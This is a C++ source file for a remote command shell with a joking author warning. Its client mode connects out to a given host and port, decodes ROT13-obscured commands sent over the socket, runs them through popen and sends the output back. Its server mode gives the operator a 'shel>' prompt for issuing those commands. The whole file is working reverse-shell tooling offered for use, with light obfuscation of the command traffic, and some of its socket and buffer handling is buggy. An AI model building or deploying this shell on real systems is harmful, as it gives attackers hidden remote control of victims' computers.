//WRITEN BY LOPSEG
// USE CAREFULLY, DO NOT HACK YOUR GRANDMA COMPUTER WITH THIS

#include <iostream>
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <netdb.h>
#include <stdexcept>
#include <string>

struct sockaddr_in serv_addr, cli_addr;
struct hostent *server;
socklen_t clilen;

void error(const char *msg)
{
    perror(msg);
    exit(0);
}

std::string exec(char* cmd) {
    char buffer[128];
    std::string result = "";
    FILE* pipe = popen(cmd, "r");
    if (!pipe) throw std::runtime_error("popen() failed!");
    try {
        while (!feof(pipe)) {
            if (fgets(buffer, 128, pipe) != NULL)
                result += buffer;
        }
    } catch (...) {
        pclose(pipe);
        throw;
    }
    pclose(pipe);
    return result;
}

std::string rot13(const char *line,int size)
{
  std::string data_roted = "";
  for (int i=0;i<size;i++){


    int letter = line[i];
    if (letter < 110 && letter >= 97)
    {
        letter = letter+13;
    }
    else if (letter >= 110 && letter <= 122)
    {
      letter = letter-13;
    }

    data_roted += letter;
  }

  return data_roted;
}

int act_as_client(const char *host, const char *port)
{
  int sockfd, portno;

  portno = atoi(port);
  sockfd = socket(AF_INET, SOCK_STREAM, 0);
  if (sockfd < 0)
      error("ERROR opening socket");
  server = gethostbyname(host);
  if (server == NULL) {
      fprintf(stderr,"ERROR, no such host\n");
      exit(0);
  }
  bzero((char *) &serv_addr, sizeof(serv_addr));
  serv_addr.sin_family = AF_INET;
  bcopy((char *)server->h_addr,
       (char *)&serv_addr.sin_addr.s_addr,
       server->h_length);
  serv_addr.sin_port = htons(portno);
  if (connect(sockfd,(struct sockaddr *) &serv_addr,sizeof(serv_addr)) < 0)
      error("ERROR connecting");
  return sockfd;
}

int act_as_server(const char *port)
{
  int sockfd, newsockfd, portno;

  sockfd = socket(AF_INET, SOCK_STREAM, 0);
  if (sockfd < 0)
     error("ERROR opening socket");
  bzero((char *) &serv_addr, sizeof(serv_addr));

  portno = atoi(port);

  serv_addr.sin_family = AF_INET;
  serv_addr.sin_addr.s_addr = INADDR_ANY;
  serv_addr.sin_port = htons(portno);

  if (bind(sockfd, (struct sockaddr *) &serv_addr,
           sizeof(serv_addr)) < 0)
           error("ERROR on binding");
  listen(sockfd,5);
  clilen = sizeof(cli_addr);
  newsockfd = accept(sockfd,
              (struct sockaddr *) &cli_addr,
              &clilen);
  if (newsockfd < 0)
       error("ERROR on accept");

  return sockfd,newsockfd;
}

std::string rot_data(const char *a, int n) // This func is just to slice the array before calling the rot13
{
  char tmp_array[n];
  int i = 0;
  while (--n >= 0)
  {
    tmp_array[i] = *a++ ;
    i++;
  }
  std::string output = rot13(tmp_array,i);
  return output;
}

int main(int argc, char *argv[])
{
  if (argc < 3) {
     fprintf(stderr,"usage %s hostname port [OPTION]\n -c To act as client\n -s To act as server\n\n", argv[0]);
     exit(0);
  }

  std::string option;
  int sockfd,n;


  if (3 == argc){
    option = argv[2];
    if ("-s" != option)
    {
      std::cout << "option not found" << std::endl;
      exit(0);
    }
    std::cout << "Starting server.." << std::endl;
    int oldsockfd;
    oldsockfd,sockfd = act_as_server(argv[1]);

    char buffer[255];
    int i = 0;
    std::string output;

  while(1)
    {
      std::cout << "shel>";
      fgets(buffer,255,stdin);

      for (char p:buffer)
      {
        if('\n' == p) break;
        i++;
      }

      output = rot_data(buffer,i);
      bzero(buffer,255);

      for(int x=0; x<output.length(); x++)
      {
        buffer[x] = output.at(x);
      }

      buffer[output.length()] = '\n';
      n = write(sockfd,buffer,output.length()+1);
      bzero(buffer,255);
      if (n < 0) std::cout << "ERROR writing to socket" << std::endl;


      n = read(sockfd,buffer,255);
      if (n < 0) std::cout <<"ERROR reading from socket" << std::endl;

      std::cout << '\n' << buffer << '\n' << std::endl;


      i = 0;
    }
    close(sockfd);
    return 0;
  }
  else if (4 == argc)
  {
    option = argv[3];
    if ("-c" != option){
    std::cout << "option not found" << std::endl;
    exit(0);}
    sockfd = act_as_client(argv[1],argv[2]);
  }



    char buffer[255];
    int i = 0;
    std::string output;

  while(1)
    {
      n = read(sockfd,buffer,255);

      if (n < 0) std::cout <<"ERROR reading from socket" << std::endl;


      for (char p:buffer)
      {
        if('\n' == p) break;
        i++;
      }

      output = rot_data(buffer,i);

      if (output == "exit")
      {
        close(sockfd);
        return 0;
      }

      bzero(buffer,255);

      for(int x=0; x<output.length(); x++)
      {
        buffer[x] = output.at(x);
      }


      output  =  exec(buffer);


      for(int x=0; x<output.length(); x++)
      {
        if (output.at(x) == '\n')
        {
          buffer[x] = ' ';
          continue;
        }
        buffer[x] = output.at(x);
      }

      n = write(sockfd,buffer,output.length());

      if (n < 0) std::cout << "ERROR writing to socket" << std::endl;
      if (!strcmp(buffer, "exit")) break;

      i = 0;
    }
    close(sockfd);
    return 0;
}
